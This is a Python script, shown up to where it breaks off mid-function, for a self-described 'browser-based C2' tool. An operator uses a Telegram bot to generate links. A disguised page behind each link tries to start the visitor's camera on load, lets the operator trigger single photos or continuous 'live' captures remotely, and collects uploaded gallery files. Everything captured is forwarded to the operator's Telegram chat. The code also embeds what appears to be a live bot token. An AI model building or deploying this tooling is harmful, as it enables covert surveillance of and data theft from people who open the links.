#!/usr/bin/env python3
"""
RDA Tool v2.2 - Remote Device Access (Browser-based C2)
========================================================
Single-script architecture: Telegram Bot C2 + Web Server + WebSocket Relay

Features:
- Fully automatic tunnel detection (Cloudflare + Ngrok)
- Zero configuration needed - just run it
- Auto-port conflict resolution
- Robust WebSocket reconnection with exponential backoff
- Termux-optimized with auto-detection
- One-click deploy

Requirements:
    pip install aiohttp psutil

Quick Start:
    1. python rda_tool.py
    2. In another terminal (automatic if available):
       cloudflared tunnel --url http://localhost:8443
       or: ngrok http 8443
    3. Send /generate to your Telegram bot

Telegram Commands:
    /generate   - Create a unique access URL
    /status     - Show active sessions
    /sessions   - List all sessions
    /revoke <id> - Revoke a session
    /clear      - Clear expired sessions
    /url        - Show current public URL
    /help       - Show help
"""

import asyncio
import base64
import json
import logging
import os
import platform
import re
import secrets
import signal
import socket
import sqlite3
import subprocess
import sys
import time
from datetime import datetime, timedelta

import aiohttp
from aiohttp import web

# ============================================================
# CONFIGURATION
# ============================================================

TOKEN = "8941952240:AAEcbI6LaKedmcshu4G193341LZGrGZ32ec"
ADMIN_ID = "8610592669"

HOST = "0.0.0.0"
PORT = 8443
PUBLIC_URL = None  # Leave as None for fully automatic detection

SESSION_TTL_HOURS = 24
JPEG_QUALITY = 80
CAPTURE_INTERVAL_MS = 300
WS_HEARTBEAT_INTERVAL = 15
DB_FILE = "sessions.db"
TG_API = f"https://api.telegram.org/bot{TOKEN}"

# Cloudflare metrics port range (from cloudflared source)
CF_METRICS_PORTS = [20241, 20242, 20243, 20244, 20245]
# Also check common explicit ports
CF_EXPLICIT_PORTS = [55555, 55556, 60123, 2000]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("RDA")
logging.getLogger("aiohttp.access").setLevel(logging.WARNING)

# ============================================================
# GLOBAL MUTABLE STATE
# ============================================================

class Config:
    pub_url = None
    port = PORT
    access_tokens = {}
    active_conns = {}

cfg = Config()

# ============================================================
# ENVIRONMENT DETECTION
# ============================================================

IS_TERMUX = "com.termux" in str(os.environ.get("PREFIX", "")) or "termux" in platform.uname().release.lower()

def get_data_dir():
    if IS_TERMUX:
        candidates = [
            os.path.expanduser("~/storage/shared"),
            "/data/data/com.termux/files/home/storage/shared",
            "/sdcard",
        ]
        for p in candidates:
            if os.path.isdir(p):
                d = os.path.join(p, "RDA")
                os.makedirs(d, exist_ok=True)
                return d
    d = os.path.join(os.getcwd(), "data")
    os.makedirs(d, exist_ok=True)
    return d

# ============================================================
# PORT MANAGEMENT
# ============================================================

def find_process_on_port(port):
    try:
        import psutil
        for conn in psutil.net_connections(kind="inet"):
            if conn.laddr.port == port and conn.status == "LISTEN":
                try:
                    proc = psutil.Process(conn.pid)
                    return conn.pid, proc.name(), proc.cmdline()[:3] if proc.cmdline() else []
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    return conn.pid, "unknown", []
    except ImportError:
        pass
    try:
        r = subprocess.run(["fuser", f"{port}/tcp"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            pids = re.findall(r'\d+', r.stdout)
            if pids:
                return int(pids[0]), "fuser", []
    except:
        pass
    try:
        r = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            return int(r.stdout.strip().split('\n')[0]), "lsof", []
    except:
        pass
    return None

def kill_process_on_port(port, force=True):
    info = find_process_on_port(port)
    if info is None:
        log.info(f"Port {port} is free.")
        return True
    pid, name, _ = info
    log.warning(f"Port {port} in use by PID {pid} ({name})")
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.5)
        try:
            os.kill(pid, 0)
            if force:
                os.kill(pid, signal.SIGKILL)
                time.sleep(0.3)
        except OSError:
            pass
        time.sleep(0.3)
        if find_process_on_port(port) is not None:
            log.error(f"Failed to free port {port}")
            return False
        log.info(f"Freed port {port}")
        return True
    except PermissionError:
        log.error(f"Permission denied killing PID {pid}. Try another port.")
        return False
    except ProcessLookupError:
        return True
    except Exception as e:
        log.error(f"Error killing process on port {port}: {e}")
        return False

# ============================================================
# TUNNEL DISCOVERY - FULLY AUTOMATIC
# ============================================================

async def discover_cloudflare_from_metrics():
    """
    Discover Cloudflare Tunnel URL by probing the cloudflared metrics API.
    cloudflared exposes /quicktunnel on a metrics port (default: 20241-20245).
    Returns the public URL or None.
    """
    # Try known default ports first
    all_ports = CF_METRICS_PORTS + CF_EXPLICIT_PORTS

    for port in all_ports:
        try:
            async with aiohttp.ClientSession() as s:
                # Try the documented /quicktunnel endpoint
                async with s.get(f"http://127.0.0.1:{port}/quicktunnel", timeout=2) as r:
                    if r.status == 200:
                        data = await r.json()
                        hostname = data.get("hostname", "")
                        if hostname:
                            url = f"https://{hostname}"
                            log.info(f"Cloudflare Tunnel detected (port {port}): {url}")
                            return url
        except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError):
            pass
        # Also try /quicktunnelurl (older versions)
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(f"http://127.0.0.1:{port}/quicktunnelurl", timeout=1) as r:
                    if r.status == 200:
                        # Older versions returned raw URL sometimes
                        text = await r.text()
                        if "trycloudflare.com" in text:
                            match = re.search(r'https://[^\s"\']+\.trycloudflare\.com', text)
                            if match:
                                url = match.group(0)
                                log.info(f"Cloudflare Tunnel detected (alt endpoint, port {port}): {url}")
                                return url
        except:
            pass

    # If no luck on known ports, try scanning random ports
    # cloudflared may bind to a random port if defaults are taken
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("http://127.0.0.1:0/quicktunnel", timeout=1) as r:
                pass  # This won't work, just placeholder
    except:
        pass

    return None

async def discover_cloudflare_from_processes():
    """
    Discover Cloudflare Tunnel URL by scanning running cloudflared processes
    and extracting the URL from their command line or environment.
    Also checks if cloudflared was started with --metrics flag.
    """
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                name = proc.info.get('name', '') or ''
                cmdline = proc.info.get('cmdline', []) or []

                if 'cloudflared' not in name and not any('cloudflared' in c for c in cmdline):
                    continue

                cmd_str = ' '.join(cmdline).lower()

                # Check if a --metrics port was specified
                metrics_match = re.search(r'--metrics\s+localhost:(\d+)', cmd_str)
                if metrics_match:
                    mp = int(metrics_match.group(1))
                    try:
                        async with aiohttp.ClientSession() as s:
                            async with s.get(f"http://127.0.0.1:{mp}/quicktunnel", timeout=2) as r:
                                if r.status == 200:
                                    data = await r.json()
                                    hostname = data.get("hostname", "")
                                    if hostname:
                                        url = f"https://{hostname}"
                                        log.info(f"Cloudflare Tunnel detected via process scan: {url}")
                                        return url
                    except:
                        pass

                # Check if --url flag has the port we're serving on
                url_match = re.search(r'--url\s+http://localhost:(\d+)', cmd_str)
                if url_match:
                    tunnel_port = int(url_match.group(1))
                    # If it's tunneling to OUR port, then we know it's running
                    if tunnel_port == cfg.port:
                        # Try to find the metrics port from process args
                        for p in psutil.process_iter(['pid', 'name', 'cmdline']):
                            try:
                                pname = p.info.get('name', '') or ''
                                pcmd = ' '.join(p.info.get('cmdline', []) or []).lower()
                                if 'cloudflared' in pname or 'cloudflared' in pcmd:
                                    pm = re.search(r'--metrics\s+localhost:(\d+)', pcmd)
                                    if pm:
                                        mp = int(pm.group(1))
                                        async with aiohttp.ClientSession() as s:
                                            async with s.get(f"http://127.0.0.1:{mp}/quicktunnel", timeout=2) as r:
                                                if r.status == 200:
                                                    data = await r.json()
                                                    if data.get("hostname"):
                                                        url = f"https://{data['hostname']}"
                                                        log.info(f"Cloudflare URL from process metrics: {url}")
                                                        return url
                            except (psutil.NoSuchProcess, psutil.AccessDenied):
                                pass
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except ImportError:
        pass

    return None

async def discover_cloudflare_logs():
    """
    Try to extract the Cloudflare tunnel URL from the terminal output
    by checking if there's a recently created tunnel log file or
        by running 'ps' and parsing output.
    """
    # Try 'ps' command to find cloudflared and extract URL from its output stream
    try:
        # On Linux/Termux, we can read /proc files
        if os.path.isdir("/proc"):
            for pid_dir in os.listdir("/proc"):
                if not pid_dir.isdigit():
                    continue
                try:
                    with open(f"/proc/{pid_dir}/cmdline", "rb") as f:
                        raw = f.read()
                    cmdline = raw.replace(b'\0', b' ').decode('utf-8', errors='replace')
                    if 'cloudflared' in cmdline and 'tunnel' in cmdline:
                        match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', cmdline)
                        if match:
                            url = match.group(0)
                            log.info(f"Cloudflare URL from /proc: {url}")
                            return url
                except (IOError, OSError):
                    pass
    except Exception:
        pass

    return None

async def discover_ngrok_url():
    """Detect ngrok public URL from its local API."""
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
                if r.status == 200:
                    data = await r.json()
                    for t in data.get("tunnels", []):
                        if t.get("proto") in ("https", "http") and t.get("public_url"):
                            url = t["public_url"]
                            log.info(f"Ngrok detected: {url}")
                            return url
                    if data.get("tunnels"):
                        url = data["tunnels"][0].get("public_url")
                        if url:
                            log.info(f"Ngrok detected: {url}")
                            return url
    except:
        pass
    return None

async def discover_tunnel_url():
    """
    Comprehensive tunnel discovery.
    Tries multiple methods in parallel and returns the first URL found.
    """
    log.info("Scanning for active tunnels (Cloudflare, Ngrok)...")

    # Run all discovery methods concurrently
    tasks = [
        discover_cloudflare_from_metrics(),
        discover_cloudflare_from_processes(),
        discover_cloudflare_logs(),
        discover_ngrok_url(),
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        if r and isinstance(r, str) and r.startswith(("http://", "https://")):
            return r

    return None

# ============================================================
# DATABASE
# ============================================================

def _db_conn():
    return sqlite3.connect(os.path.join(get_data_dir(), DB_FILE))

def init_db():
    conn = _db_conn()
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY, admin_id TEXT NOT NULL,
        created_at TEXT NOT NULL, expires_at TEXT NOT NULL,
        last_seen TEXT, status TEXT DEFAULT 'waiting', device_info TEXT)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT NOT NULL, type TEXT NOT NULL,
        timestamp TEXT NOT NULL, data BLOB, filename TEXT,
        forwarded INTEGER DEFAULT 0)""")
    conn.commit()
    conn.close()
    log.info(f"Database ready: {os.path.join(get_data_dir(), DB_FILE)}")

def db_add_session(sid, aid, ttl=SESSION_TTL_HOURS):
    now, exp = datetime.utcnow(), datetime.utcnow() + timedelta(hours=ttl)
    conn = _db_conn()
    conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?)",
                 (sid, aid, now.isoformat(), exp.isoformat(), None, "waiting", None))
    conn.commit()
    conn.close()

def db_get_session(sid):
    try:
        conn = _db_conn()
        row = conn.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
        conn.close()
        if row:
            cols = ["id","admin_id","created_at","expires_at","last_seen","status","device_info"]
            return dict(zip(cols, row))
    except: pass
    return None

def db_update_session(sid, **kw):
    try:
        conn = _db_conn()
        sets, vals = [], []
        for k, v in kw.items():
            sets.append(f"{k}=?")
            vals.append(v)
        vals.append(sid)
        conn.execute(f"UPDATE sessions SET {','.join(sets)} WHERE id=?", vals)
        conn.commit()
        conn.close()
    except Exception as e:
        log.error(f"DB update error: {e}")

def db_list_sessions(aid):
    try:
        conn = _db_conn()
        rows = conn.execute("SELECT * FROM sessions WHERE admin_id=? ORDER BY created_at DESC", (aid,)).fetchall()
        conn.close()
        cols = ["id","admin_id","created_at","expires_at","last_seen","status","device_info"]
        return [dict(zip(cols, r)) for r in rows]
    except: return []

def db_save_capture(sid, ctype, data, fname=None):
    conn = _db_conn()
    cur = conn.execute("INSERT INTO captures (session_id,type,timestamp,data,filename) VALUES (?,?,?,?,?)",
                       (sid, ctype, datetime.utcnow().isoformat(), data, fname))
    cid = cur.lastrowid
    conn.commit()
    conn.close()
    return cid

def db_get_pending_captures(sid):
    try:
        conn = _db_conn()
        rows = conn.execute("SELECT * FROM captures WHERE session_id=? AND forwarded=0 ORDER BY id ASC", (sid,)).fetchall()
        conn.close()
        cols = ["id","session_id","type","timestamp","data","filename","forwarded"]
        return [dict(zip(cols, r)) for r in rows]
    except: return []

def db_mark_forwarded(cid):
    try:
        conn = _db_conn()
        conn.execute("UPDATE captures SET forwarded=1 WHERE id=?", (cid,))
        conn.commit()
        conn.close()
    except: pass

# ============================================================
# TELEGRAM HELPERS
# ============================================================

async def tg_send(chat_id, text, parse="HTML"):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f"{TG_API}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": parse},
                timeout=aiohttp.ClientTimeout(total=15)) as r:
                return await r.json()
    except Exception as e:
        log.error(f"TG msg error: {e}")

async def tg_send_photo(chat_id, data, caption=None):
    try:
        async with aiohttp.ClientSession() as s:
            fd = aiohttp.FormData()
            fd.add_field("chat_id", str(chat_id))
            fd.add_field("photo", data, filename=f"cap_{int(time.time())}.jpg", content_type="image/jpeg")
            if caption:
                fd.add_field("caption", caption)
            async with s.post(f"{TG_API}/sendPhoto", data=fd, timeout=aiohttp.ClientTimeout(total=30)) as r:
                return await r.json()
    except Exception as e:
        log.error(f"TG photo error: {e}")

async def tg_send_doc(chat_id, data, fname, caption=None):
    try:
        async with aiohttp.ClientSession() as s:
            fd = aiohttp.FormData()
            fd.add_field("chat_id", str(chat_id))
            fd.add_field("document", data, filename=fname)
            if caption:
                fd.add_field("caption", caption)
            async with s.post(f"{TG_API}/sendDocument", data=fd, timeout=aiohttp.ClientTimeout(total=60)) as r:
                return await r.json()
    except Exception as e:
        log.error(f"TG doc error: {e}")

async def tg_poll(offset=None):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"{TG_API}/getUpdates",
                params={"timeout": 30, "offset": offset},
                timeout=aiohttp.ClientTimeout(total=35)) as r:
                return await r.json()
    except:
        return None

# ============================================================
# SESSION / TOKEN MGMT
# ============================================================

def create_session(aid):
    sid = secrets.token_urlsafe(16)
    tok = secrets.token_urlsafe(8)
    cfg.access_tokens[tok] = sid
    db_add_session(sid, aid)
    return sid, tok

def get_effective_public_url():
    """Return the best public URL: PUBLIC_URL > auto-detected tunnel > local fallback."""
    if PUBLIC_URL:
        return PUBLIC_URL.rstrip("/")
    if cfg.pub_url:
        return cfg.pub_url.rstrip("/")
    return f"http://{HOST}:{cfg.port}"

def get_ws_url(public_url):
    """Convert an HTTP/HTTPS public URL to a WebSocket URL."""
    if public_url.startswith("https"):
        return "wss://" + public_url.split("://")[1] + "/ws"
    else:
        return "ws://" + public_url.split("://")[1] + "/ws"

# ============================================================
# EMBEDDED HTML PAGE
# ============================================================

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Session</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{text-align:center;padding:20px;max-width:600px;width:100%}
.vid-wrap{position:relative;width:100%;max-width:480px;margin:15px auto;border-radius:12px;overflow:hidden;background:#1a1a1a;border:1px solid #333}
video{width:100%;display:block;transform:scaleX(-1)}
.btn{padding:12px 28px;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin:6px;transition:all .2s}
.btn-pri{background:#00ff88;color:#000}
.btn-pri:hover{background:#00cc6a}
.btn-pri:disabled{background:#446655;color:#888;cursor:not-allowed}
.btn-danger{background:#ff3344;color:#fff}
.btn-danger:hover{background:#cc2936}
.btn-sec{background:#333;color:#fff}
.btn-sec:hover{background:#444}
.st{border-radius:8px;font-size:14px;padding:10px;margin:10px 0}
.st-wait{background:#1a3a5c;color:#66b3ff}
.st-ok{background:#0a3a1a;color:#66ff99}
.st-err{background:#3a1a1a;color:#ff6666}
.hidden{display:none!important}
.tab-bar{display:flex;gap:2px;margin:15px 0;background:#1a1a1a;border-radius:10px;padding:4px}
.tab{flex:1;padding:10px;border:none;border-radius:8px;font-size:14px;cursor:pointer;background:transparent;color:#888;transition:all .2s}
.tab.on{background:#00ff88;color:#000}
.tc{display:none}
.tc.on{display:block}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:15px 0;max-height:400px;overflow-y:auto}
.grid img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:6px;border:1px solid #333;cursor:pointer;transition:transform .2s}
.grid img:hover{transform:scale(1.05)}
h2{font-size:22px;margin-bottom:4px}
.sub{color:#666;font-size:13px;margin-bottom:15px}
.badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
.badge-live{background:#ff3344;color:#fff;animation:pulse 1.5s infinite}
@keyframes pulse{0%{opacity:1}50%{opacity:.5}100%{opacity:1}}
</style>
</head>
<body>
<div class=container>
<h2>&#128247; Remote Access</h2>
<p class=sub id=sub>Browser-based device access tool</p>
<div id=st class="st st-wait">&#10227; Connecting...</div>
<div class=tab-bar>
<button class="tab on" onclick=sw('cam')>&#128248; Camera</button>
<button class=tab onclick=sw('gal')>&#128193; Gallery</button>
</div>
<div id=tc-cam class="tc on">
<div class=vid-wrap><video id=v autoplay playsinline muted></video></div>
<div>
<button id=bcam class="btn btn-pri hidden" onclick=cap()>&#128247; Capture</button>
<button id=bstart class="btn btn-sec" onclick=startCam()>&#9654; Start Camera</button>
<button id=bstop class="btn btn-danger hidden" onclick=stopCam()>&#9632; Stop</button>
</div>
<div style=margin-top:12px>
<button id=blive class="btn btn-sec" onclick=toggleLive()>&#128200; Start Live View</button>
<button class="btn btn-danger hidden" id=bstoplive onclick=toggleLive()>&#9632; Stop Live</button>
<span id=liveBadge class="badge badge-live hidden">LIVE</span>
</div>
</div>
<div id=tc-gal class=tc>
<div style=margin:15px 0>
<input type=file id=fup accept="image/*,video/*" multiple style=display:none onchange=hf(this.files)>
<button class="btn btn-pri" onclick=document.getElementById('fup').click()>&#128193; Select Files</button>
</div>
<div id=flist style=color:#888;font-size:13px>No files selected</div>
<div class=grid id=grid></div>
<button id=bupload class="btn btn-pri hidden" onclick=upSel()>&#11014; Upload Selected</button>
</div>
<canvas id=c style=display:none></canvas>
</div>
<script>
var WS='__WS__',TOK='__TOK__',Q=__Q__,IV=__IV__;
var St={OFF:0,CONN:1,ON:2,RECON:3};
var st=St.OFF,ws=null,ms=null,li=null,sel=[],rc=0,mr=50,bd=1,md=30;
var $=function(i){return document.getElementById(i)};
var ss=function(m,t){var e=$('st');e.textContent=m;e.className='st st-'+t};
var sw=function(t){document.querySelectorAll('.tc').forEach(function(e){e.classList.remove('on')});
document.querySelectorAll('.tab').forEach(function(e){e.classList.remove('on')});
$('tc-'+t).classList.add('on');event.target.classList.add('on')};
function con(){if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
st=St.CONN;ss('\u27f3 Connecting... ('+(rc+1)+')','wait');
try{ws=new WebSocket(WS+'?token='+TOK);
ws.onopen=function(){st=St.ON;rc=0;ss('\u2713 Connected - Session active','ok');
$('sub').textContent='Browser-based device access tool';
ws.send(JSON.stringify({type:'hello',token:TOK}))};
ws.onclose=function(){st=St.OFF;ws=null;ss('\u2717 Disconnected. Reconnecting...','err');recon()};
ws.onerror=function(){if(st===St.CONN)ss('\u2717 Connection failed. Retrying...','err')};
ws.onmessage=function(e){try{var m=JSON.parse(e.data);
if(m.type==='ping'){ws.send(JSON.stringify({type:'pong'}));return}
if(m.type==='capture'){if(ms)cap();return}
if(m.type==='start_live'){if(!li&&ms)sl();return}
if(m.type==='stop_live'){sl2();return}
if(m.type==='cmd'&&m.a==='capture')cap()}catch(ex){}};
}catch(e){st=St.OFF;ss('\u2717 Error: '+e.message,'err');recon()}}
function recon(){if(rc>=mr){ss('\u2717 Max attempts. Refresh page.','err');return}
st=St.RECON;var d=Math.min(bd*Math.pow(2,rc),md)+Math.random()*2;rc++;
ss('\u27f3 Reconnect in '+Math.round(d)+'s ('+rc+')','wait');setTimeout(con,d*1000)}
function sm(o){if(ws&&ws.readyState===WebSocket.OPEN){ws.send(JSON.stringify(o));return 1}return 0}
setInterval(function(){if(ws&&ws.readyState===WebSocket.OPEN)ws.send(JSON.stringify({type:'ping'}))},20000);
async function sc(){try{if(ms){ms.getTracks().forEach(function(t){t.stop()});ms=null}
ms=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:false});
$('v').srcObject=ms;$('bstart').classList.add('hidden');$('bstop').classList.remove('hidden');$('bcam').classList.remove('hidden');sm({type:'cam_on'});ss('\u2713 Camera active','ok')}catch(e){ss('\u2717 Camera denied: '+e.message,'err')}}
function stc(){if(ms){ms.getTracks().forEach(function(t){t.stop()});ms=null}sl2();$('v').srcObject=null;$('bstart').classList.remove('hidden');$('bstop').classList.add('hidden');$('bcam').classList.add('hidden')}
function cap(){var v=$('v');if(!v||!v.videoWidth)return;var c=$('c');c.width=v.videoWidth;c.height=v.videoHeight;var ctx=c.getContext('2d');ctx.scale(-1,1);ctx.drawImage(v,-c.width,0,c.width,c.height);var d=c.toDataURL('image/jpeg',Q);if(sm({type:'photo',data:d,ts:Date.now()}))ss('\u2713 Captured!','ok')}
function tl(){if(li){sl2();$('blive').classList.remove('hidden');$('bstoplive').classList.add('hidden');$('liveBadge').classList.add('hidden')}else{if(!ms){sc();setTimeout(function(){sl()},1000)}else{sl()}$('blive').classList.add('hidden');$('bstoplive').classList.remove('hidden');$('liveBadge').classList.remove('hidden')}}
function sl(){if(li)clearInterval(li);li=setInterval(function(){if(ms&&ws&&ws.readyState===WebSocket.OPEN)cap()},IV)}
function sl2(){if(li){clearInterval(li);li=null}}
function hf(fs){sel=Array.from(fs);$('flist').textContent=sel.length+' file(s) selected';var g=$('grid');g.innerHTML='';sel.forEach(function(f,i){if(f.type.startsWith('image/')){var r=new FileReader();r.onload=function(e){var img=document.createElement('img');img.src=e.target.result;img.onclick=function(){up1(f)};img.title=f.name;g.appendChild(img)};r.readAsDataURL(f)}});$('bupload').classList.remove('hidden')}
function upSel(){sel.forEach(function(f){up1(f)});$('bupload').classList.add('hidden');$('flist').textContent='Uploading...'}
function up1(f){var r=new FileReader();r.onload=function(e){var d=e.target.result,img=f.type.startsWith('image/');if(sm({type:img?'gallery_photo':'gallery_video',data:d,name:f.name,ts:Date.now()}))ss('\u2713 Sent: '+f.name,'ok')};r.readAsDataURL(f)}
document.addEventListener('paste',function(e){for(var i=0;i<e.clipboardData.items.length;i++){if(e.clipboardData.items[i].type.startsWith('image/'))up1(e.clipboardData.items[i].getAsFile())}});
con();setTimeout(function(){sc().catch(function(){})},1000);
document.addEventListener('visibilitychange',function(){if(!document.hidden&&(!ws||ws.readyState!==WebSocket.OPEN))con()});
</script>
</body>
</html>"""

def gen_html(ws_url, token):
    h = HTML_PAGE.replace("__WS__", ws_url).replace("__TOK__", token)
    h = h.replace("__Q__", str(JPEG_QUALITY / 100)).replace("__IV__", str(CAPTURE_INTERVAL_MS))
    return h

# ============================================================
# WEB SERVER HANDLERS
# ============================================================

async def index(req):
    tok = req.match_info.get("token", "")
    sid = cfg.access_tokens.get(tok)
    if not sid:
        return web.Response(text="Invalid link.", status=404)

    s = db_get_session(sid)
    if not s:
        return web.Response(text="Session not found.", status=404)
    if datetime.utcnow() > datetime.fromisoformat(s["expires_at"]):
        return web.Response(text="This link has expired.", status=410)

    # Use the public URL for WebSocket, ensuring wss:// for HTTPS
    base = get_effective_public_url()
    # Convert http->ws / https->wss properly
    if base.startswith("https"):
        ws_url = "wss://" + base.split("://")[1] + "/ws"
    else:
        ws_url = "ws://" + base.split("://")[1] + "/ws"

    return web.Response(text=gen_html(ws_url, tok), content_type="text/html; charset=utf-8")

async def ws_handler(req):
    tok = req.query.get("token", "")
    sid = cfg.access_tokens.get(tok)
    if not sid:
        return web.Response(text="Bad token", status=403)

    ws = web.WebSocketResponse(max_msg_size=50*1024*1024, heartbeat=WS_HEARTBEAT_INTERVAL, autoping=True)
    await ws.prepare(req)

    if sid in cfg.active_conns:
        try:
            await cfg.active_conns[sid].close()
        except:
            pass
    cfg.active_conns[sid] = ws
    db_update_session(sid, status="connected", last_seen=datetime.utcnow().isoformat())
    log.info(f"[+] Session {sid[:8]} connected ({len(cfg.active_conns)} active)")

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                try:
                    d = json.loads(msg.data)
                    t = d.get("type", "")

                    if t == "hello":
                        db_update_session(sid, status="active",
                            device_info=json.dumps({"connected_at": datetime.utcnow().isoformat()}),
                            last_seen=datetime.utcnow().isoformat())
                        log.info(f"[*] Session {sid[:8]} active")

                    elif t == "ping":
                        try:
                            await ws.send_json({"type": "pong"})
                        except:
                            pass
                    elif t == "pong":
                        pass

                    elif t == "photo":
                        raw = d.get("data", "")
                        if raw.startswith("data:image"):
                            img = base64.b64decode(raw.split(",", 1)[1])
                            cid = db_save_capture(sid, "camera_photo", img, f"cam_{int(time.time()*1000)}.jpg")
                            log.info(f"[<] Camera photo {len(img)}B")
                            asyncio.ensure_future(fwd_capture(sid, cid))

                    elif t == "gallery_photo":
                        raw = d.get("data", "")
                        fn = d.get("name", f"gal_{int(time.time()*1000)}.jpg")
                        if raw.startswith("data:image"):
                            img = base64.b64decode(raw.split(",", 1)[1])
                            cid = db_save_capture(sid, "gallery_photo", img, fn)
                            log.info(f"[<] Gallery photo {fn} {len(img)}B")
                            asyncio.ensure_future(fwd_capture(sid, cid))

                    elif t == "gallery_video":
                        raw = d.get("data", "")
                        fn = d.get("name", f"gal_{int(time.time()*1000)}.mp4")
                        if raw.startswith("data:"):
                            b = base64.b64decode(raw.split(",", 1)[1])
                            cid = db_save_capture(sid, "gallery_video", b, fn)
                            log.info(f"[<] Gallery video {fn} {len(b)}B")
                            asyncio.ensure_future(fwd_capture(sid, cid))

                    elif t == "cam_on":
                        db_update_session(sid, status="camera_active")

                    db_update_session(sid, last_seen=datetime.utcnow().isoformat())

                except json.JSONDecodeError:
                    pass
                except Exception as e:
                    log.error(f"WS msg err: {e}")

            elif msg.type in (web.WSMsgType.CLOSE, web.WSMsgType.ERROR):
                break

    except asyncio.CancelledError:
        pass
    except Exception as e:
        log.error(f"WS handler error for {sid[:8]}: {e}")
    finally:
        cfg.active_conns.pop(sid, None)
        db_update_session(sid, status="disconnected", last_seen=datetime.utcnow().isoformat())
        log.info(f"[-] Session {sid[:8]} disconnected ({len(cfg.active_conns)} remaining)")

    return ws

async def fwd_capture(sid, cid):
    s = db_get_session(sid)
    if not s:
        return
    aid = s["admin_id"]
    caps = db_get_pending_captures(sid)
    for c in caps:
        if c["id"] != cid:
            continue
        try:
            cap = (f"<b>New Capture</b>\n"
                   f"Type: {c['type']}\n"
                   f"Session: <code>{sid[:12]}...</code>\n"
                   f"Size: {len(c['data'])}B")
            if c["type"] in ("camera_photo", "gallery_photo"):
                await tg_send_photo(aid, c["data"], caption=cap)
            else:
                await tg_send_doc(aid, c["data"], c["filename"] or f"cap_{c['id']}.bin", caption=cap)
            db_mark_forwarded(c["id"])
            log.info(f"[>] Forwarded cap {c['id']}")
        except Exception as e:
            log.error(f"Fwd error cap {c['id']}: {e}")
        break

# ============================================================
# TELEGRAM BOT
# ============================================================

async def handle_cmd(upd):
    msg = upd.get("message", {})
    chat = msg.get("chat", {}).get("id")
    text = msg.get("text", "")
    fid = str(msg.get("from", {}).get("id", ""))
    if fid != ADMIN_ID:
        await tg_send(chat, "\u26d4 Unauthorized.")
        return
    if not text:
        return

    parts = text.split()
    cmd = parts[0].lower()

    if cmd in ("/start", "/help"):
        await tg_send(chat,
            "<b>Remote Device Access Tool v2.2</b>\n\n"
            "<code>/generate</code> - Create an access URL\n"
            "<code>/link</code> - Alias for /generate\n"
            "<code>/status</code> - Show active session count\n"
            "<code>/sessions</code> - List all sessions\n"
            "<code>/revoke &lt;id&gt;</code> - Revoke a session\n"
            "<code>/clear</code> - Clear expired sessions\n"
            "<code>/url</code> - Show current public URL\n"
            "<code>/help</code> - This help\n\n"
            f"Current URL: {get_effective_public_url()}")

    elif cmd in ("/generate", "/link", "/new"):
        sid, tok = create_session(fid)
        base = get_effective_public_url()
        url = f"{base}/a/{tok}"
        await tg_send(chat,
            f"<b>Access Link Generated</b>\n\n"
            f"<code>{url}</code>\n\n"
            f"ID: <code>{sid[:16]}...</code>\n"
            f"Expires: {SESSION_TTL_HOURS}h\n"
            f"Public URL: {base}\n"
            f"Active WebSocket connections: {len(cfg.active_conns)}")

    elif cmd == "/status":
        sess = db_list_sessions(fid)
        act = [s for s in sess if s["status"] in ("active", "connected", "camera_active")]
        msg = (f"<b>Session Status</b>\n\n"
               f"Active: {len(act)}\n"
               f"Total: {len(sess)}\n"
               f"Live WebSocket connections: {len(cfg.active_conns)}\n"
               f"Public URL: {get_effective_public_url()}")
        await tg_send(chat, msg)

    elif cmd == "/sessions":
        sess = db_list_sessions(fid)
        if not sess:
            await tg_send(chat, "No sessions.")
            return
        msg = "<b>Sessions</b>\n\n"
        for s in sess[:15]:
            icons = {"waiting": "\u23f3", "connected": "\U0001f7e2",
                     "active": "\U0001f7e2", "camera_active": "\U0001f4f7",
                     "disconnected": "\U0001f534", "expired": "\u274c", "revoked": "\U0001f6ab"}
            ic = icons.get(s["status"], "\u26aa")
            msg += f"{ic} <code>{s['id'][:12]}...</code> ({s['status']})\n"
        if len(sess) > 15:
